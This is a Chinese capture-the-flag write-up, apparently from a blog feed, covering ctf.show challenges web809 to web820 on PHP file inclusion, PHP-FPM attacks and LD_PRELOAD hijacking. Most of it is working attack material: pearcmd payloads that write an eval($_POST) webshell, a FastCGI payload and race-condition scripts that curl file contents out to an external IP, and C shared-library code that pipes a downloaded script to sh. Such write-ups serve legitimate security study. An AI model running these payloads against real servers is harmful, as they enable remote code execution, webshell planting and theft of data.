class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($file) &amp;&amp; !preg_match(<span class="string">&quot;/input|data|phar|log|filter/i&quot;</span>,$file))&#123;</span><br><span class="line">    include $file;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    <span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;info&#x27;</span>]))&#123;</span><br><span class="line">        phpinfo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看p牛的文章：<a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=system(<span class="string">&#x27;cat /f*&#x27;</span>);?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /?file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/?&gt;&lt;?=<span class="built_in">eval</span>($_POST[<span class="number">1</span>]);?&gt;+/tmp/<span class="number">1.</span>txt HTTP/<span class="number">1.1</span></span><br><span class="line">Host: e38c9852-ecd9-442b-984d-3b773381fc5a.challenge.ctf.show</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">101.0</span><span class="number">.4951</span><span class="number">.54</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.9</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span>,en;q=<span class="number">0.8</span></span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h1 id="web810-SSRF打PHP-FPM"><a href="#web810-SSRF打PHP-FPM" class="headerlink" title="web810 SSRF打PHP-FPM"></a>web810 <strong>SSRF打PHP-FPM</strong></h1><p>用gopherus生成payload打就行</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220510203847-ce3wt2b.png" alt="image.png"></p><p>后面的%00需要url编码</p><h1 id="web811-file-put-contents打PHP-FPM"><a href="#web811-file-put-contents打PHP-FPM" class="headerlink" title="web811 file_put_contents打PHP-FPM"></a>web811 file_put_contents打PHP-FPM</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$content</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以通过搭建恶意ftp服务器攻击9000端口的php-fpm</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=ftp://aaa@<span class="number">1.117</span><span class="number">.144</span><span class="number">.41</span>:<span class="number">23</span>/<span class="number">123</span>&amp;content=%01%01%<span class="number">00</span>%01%<span class="number">00</span>%08%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%01%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%01%04%<span class="number">00</span>%01%<span class="number">00</span>%F6%06%<span class="number">00</span>%0F%10SERVER_SOFTWAREgo%<span class="number">20</span>/%20fcgiclient%<span class="number">20</span>%0B%09REMOTE_ADDR127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>%0F%08SERVER_PROTOCOLHTTP/<span class="number">1.1</span>%0E%02CONTENT_LENGTH92%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%<span class="number">20</span>%3D%20On%0Adisable_functions%<span class="number">20</span>%3D%<span class="number">20</span>%0Aauto_prepend_file%<span class="number">20</span>%3D%20php%3A//<span class="built_in">input</span>%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%01%04%<span class="number">00</span>%01%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%01%05%<span class="number">00</span>%01%<span class="number">00</span>%5C%04%<span class="number">00</span>%3C%3Fphp%20system%<span class="number">28</span>%27curl%20http%3A//<span class="number">1.117</span><span class="number">.144</span><span class="number">.41</span>%3A4444/%60cat%<span class="number">20</span>/f%2A%<span class="number">60</span>/%<span class="number">27</span>%<span class="number">29</span>%3Bdie%<span class="number">28</span>%<span class="number">27</span>-----Made-by-SpyD3r-----%0A%<span class="number">27</span>%<span class="number">29</span>%3B%3F%3E%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span></span><br></pre></td></tr></table></figure><p>开恶意ftp服务器然后打就行</p><h1 id="web812-PHP-FPM未授权"><a href="#web812-PHP-FPM未授权" class="headerlink" title="web812 PHP-FPM未授权"></a>web812 PHP-FPM未授权</h1><p><a href="https://github.com/wuyunfeng/Python-FastCGI-Client">https://github.com/wuyunfeng/Python-FastCGI-Client</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py -c <span class="string">&#x27;&lt;?php system(&quot;cat /f*&quot;);?&gt;&#x27;</span> -p <span class="number">28026</span> pwn.challenge.ctf.show /usr/local/lib/php/System.php</span><br></pre></td></tr></table></figure><h1 id="web813-劫持mysqli-so"><a href="#web813-劫持mysqli-so" class="headerlink" title="web813 劫持mysqli.so"></a>web813 劫持mysqli.so</h1><p>同样是开了FASTCGI，但是这道题本意让我们用恶意so拓展打</p><p>题目满足条件：</p><ol><li>extension目录已知且可写</li><li>命令行或fpm能够加载恶意拓展文件</li><li>有调用自定义函数</li></ol><p>所以主要是考察编写php的拓展so文件从而达到劫持</p><p>这里用ext_skel框架开发扩展</p><p><a href="https://www.php.net/releases/">https://www.php.net/releases/</a>下载相应版本源码包</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php ext_skel.php --ext ctfshow --std</span><br></pre></td></tr></table></figure><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220515204421-9sozwed.png" alt="image.png"></p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220515204451-vsvl7sn.png" alt="image.png"></p><p>然后编译</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">phpize</span><br><span class="line">./configure --with-php-config=/www/server/php/<span class="number">73</span>/bin/php-config</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>接着把生成的恶意so文件传到目标服务器的extension目录即可</p><p>这里自己尝试的时候的坑：</p><ol><li>如果用例如宝塔安装的php，要指定他的php-config文件</li><li>php-config要和你下载源码，也就是想重写的so文件的php版本一样，否则不能成功</li><li>一定要让目标重新把我们恶意的so扩展加载之后才能打</li></ol><h1 id="web814-LD-PRELOAD"><a href="#web814-LD-PRELOAD" class="headerlink" title="web814 LD_PRELOAD"></a>web814 LD_PRELOAD</h1><p>getuid</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">payload</span>()&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;curl https://your-shell.com/1.117.144.41:4444 | sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">getuid</span>()</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>)==<span class="literal">NULL</span>)&#123; <span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">        <span class="title function_ invoke__">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">payload</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC poc.c -o hack&amp;&amp;gcc --share hack -o hack.so</span><br></pre></td></tr></table></figure><h1 id="web815-劫持构造器"><a href="#web815-劫持构造器" class="headerlink" title="web815 劫持构造器"></a>web815 <strong>劫持构造器</strong></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define _GNU_SOURCE </span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt; </span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt; </span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt; </span></span><br><span class="line"><span class="title function_ invoke__">__attribute__</span> ((__constructor__)) <span class="keyword">void</span> <span class="title function_ invoke__">preload</span> (<span class="keyword">void</span>) </span><br><span class="line">&#123; </span><br><span class="line"><span class="title function_ invoke__">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;curl https://your-shell.com/1.117.144.41:4444 | sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="web816-临时文件利用"><a href="#web816-临时文件利用" class="headerlink" title="web816 临时文件利用"></a>web816 <strong>临时文件利用</strong></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$env</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;env&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$env</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="variable">$env</span>.<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/tmp&quot;</span>)[<span class="number">2</span>]);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo ctfshow&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>往tmp目录下面传临时文件，把LD_PRELOAD指向临时文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://da7e9cb2-9fd2-4b66-a4d3-a46b3927d67f.challenge.ctf.show/?env=LD_PRELOAD=/tmp/&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;hack.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()&#125;</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">html = response.text</span><br><span class="line"><span class="built_in">print</span>(html)</span><br></pre></td></tr></table></figure><h1 id="web817-nginx缓存临时文件"><a href="#web817-nginx缓存临时文件" class="headerlink" title="web817 nginx缓存临时文件"></a>web817 nginx缓存临时文件</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^\/(\w+\/?)+$/&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;cat <span class="subst">$file</span>&quot;</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于我是先做的818，所以这里是818之后，仿照羽师傅的脚本自己写的，思路也就是nginx缓存，然后去包含&#x2F;proc&#x2F;fid&#x2F;fd&#x2F;{fd}下的文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">port = <span class="number">28144</span></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">s.send(<span class="string">f&#x27;&#x27;&#x27;GET / HTTP/1.1</span></span><br><span class="line"><span class="string">Host:127.0.0.1</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line">rev=s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">s.close()</span><br><span class="line">pid = re.findall(<span class="string">&quot;(.*?)www-data&quot;</span>,rev)[<span class="number">0</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(pid)</span><br><span class="line"></span><br><span class="line">con = <span class="string">&quot;curl http://1.117.144.41:4444/`cat /*`;&quot;</span> + <span class="string">&quot;5&quot;</span> * <span class="number">1024</span> * <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">l = <span class="built_in">len</span>(con)</span><br><span class="line">x = <span class="string">f&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: <span class="subst">&#123;l&#125;</span></span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">&#123;con&#125;</span>&#x27;&#x27;&#x27;</span>.encode()</span><br><span class="line">s.send(x)</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bruter</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">for</span> fd <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">40</span>):</span><br><span class="line"><span class="built_in">print</span>(fd)</span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">s.send(<span class="string">f&#x27;&#x27;&#x27;GET /?file=/proc/<span class="subst">&#123;pid&#125;</span>/fd/<span class="subst">&#123;fd&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: fuckyou</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">2048</span>).decode())</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">t = threading.Thread(target=upload)</span><br><span class="line">t.start()</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">a = threading.Thread(target=bruter)</span><br><span class="line">a.start()</span><br></pre></td></tr></table></figure><h1 id="web818-nginx-body缓存写入临时文件"><a href="#web818-nginx-body缓存写入临时文件" class="headerlink" title="web818 nginx body缓存写入临时文件"></a>web818 nginx body缓存写入临时文件</h1><p>原理略，整理在另一篇笔记</p><p>直接学习羽师傅脚本即可，他这里是用socket库来进行网络请求的。</p><p>关键点是31行的恶意字节填充，让hack.so的文件内容写入nginx产生的临时文件</p><p>接着用bruter函数对proc目录进行一个爆破即可，这里的pid题目中会给到，所以只用爆破后面的fd即可</p><p>羽师傅的脚本真的清晰，学习了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">port= <span class="number">28118</span></span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">s.send(<span class="string">f&#x27;&#x27;&#x27;GET / HTTP/1.1</span></span><br><span class="line"><span class="string">Host:127.0.0.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line">data=s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">s.close()</span><br><span class="line">pid = re.findall(<span class="string">&#x27;(.*?) www-data&#x27;</span>,data)[<span class="number">0</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(pid)</span><br><span class="line">l=<span class="built_in">str</span>(<span class="built_in">len</span>(<span class="built_in">open</span>(<span class="string">&#x27;../hack.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()+<span class="string">b&#x27;\n&#x27;</span>*<span class="number">1024</span>*<span class="number">200</span>)).encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">x=<span class="string">b&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: yu22x</span></span><br><span class="line"><span class="string">Content-Length: &#x27;&#x27;&#x27;</span>+l+<span class="string">b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>+<span class="built_in">open</span>(<span class="string">&#x27;../hack.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()+<span class="string">b&#x27;\n&#x27;</span>*<span class="number">1024</span>*<span class="number">200</span>+<span class="string">b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">s.send(x)</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bruter</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">for</span> fd <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">40</span>):</span><br><span class="line"><span class="built_in">print</span>(fd)</span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">s.send(<span class="string">f&#x27;&#x27;&#x27;GET /?env=LD_PRELOAD=/proc/<span class="subst">&#123;pid&#125;</span>/fd/<span class="subst">&#123;fd&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: yu22x</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">2048</span>).decode())</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    t = threading.Thread(target=upload)</span><br><span class="line">    t.start()</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    a = threading.Thread(target=bruter)</span><br><span class="line">    a.start()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web819-环境变量注入"><a href="#web819-环境变量注入" class="headerlink" title="web819 环境变量注入"></a>web819 环境变量注入</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$env = $_GET[<span class="string">&#x27;env&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(isset($env))&#123;</span><br><span class="line">    putenv($env);</span><br><span class="line">    system(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?env=BASH_FUNC_whoami%%=() &#123; cat /f*; &#125;</span><br></pre></td></tr></table></figure><p>参照p牛的文章</p><h1 id="web820-奇怪的jpg型webshell"><a href="#web820-奇怪的jpg型webshell" class="headerlink" title="web820 奇怪的jpg型webshell"></a>web820 奇怪的jpg型webshell</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$ef</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$tmpname</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>) &amp;&amp; (<span class="variable">$ef</span>!=<span class="literal">false</span>) &amp;&amp; (<span class="variable">$ef</span>[<span class="string">&#x27;mime&#x27;</span>]==<span class="string">&#x27;image/jpeg&#x27;</span>))&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmpname</span>));</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;file upload success!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要是base64_decode这个函数在解码的时候仅保留26+26+2+10，也就是base64里的64个有效字符，其他字符会丢弃</p><p>因此可以构造一个jpg，解码后是个webshell</p><p>可以用010对一个1*1像素的图片构造</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220515225616-m8bgojg.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">web801-web820</summary>
    
    
    
    <category term="ctfStudy" scheme="https://xianbeil.github.io/categories/ctfStudy/"/>
    
    
